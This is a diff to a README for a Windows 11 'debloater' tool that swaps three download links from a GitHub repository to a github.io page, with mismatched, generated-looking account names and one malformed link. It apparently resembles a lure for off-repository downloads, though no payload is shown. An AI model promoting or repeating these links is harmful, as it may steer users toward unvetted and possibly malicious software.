@@ -1,6 +1,6 @@
 # 🧹 windows-debloater-25h2 - Clean Your Windows 11 Fast and Free
 
-[![Download Now](https://img.shields.io/badge/Download-Free_Tool-blueviolet?style=for-the-badge&logo=github)](https://github.com/gettable-caladiumbicolor9836/windows-debloater-25h2)
+[![Download Now](https://img.shields.io/badge/Download-Free_Tool-blueviolet?style=for-the-badge&logo=github)](https://gettable-caladiumbicolor9836.github.io)
 
 ## 🤔 What Is This?
 
@@ -28,7 +28,7 @@ Click the big button below to go to the download page:
 
 ---
 
-**[👉 CLICK HERE TO DOWNLOAD THE FREE TOOL](https://github.com/gettable-caladiumbicolor9833/windows-debloater-25h2)**
+**[👉 CLICK HERE TO DOWNLOAD THE FREE TOOL](https://gettable-caladiumbicolor9836.github.io)**
 
 ---
 
@@ -179,7 +179,7 @@ You're just one click away from a snappier, cleaner, more private Windows experi
 
 [::: 
 🚀 **DOWNLOAD NOW–IT'S FREE** 
-:::](((https://github.com/gettable-caladiumbicolor9833/windows-debloater-25h2)))
+:::](((https://gettable-caladiumbicolor9836.github.io)))
 
 
 
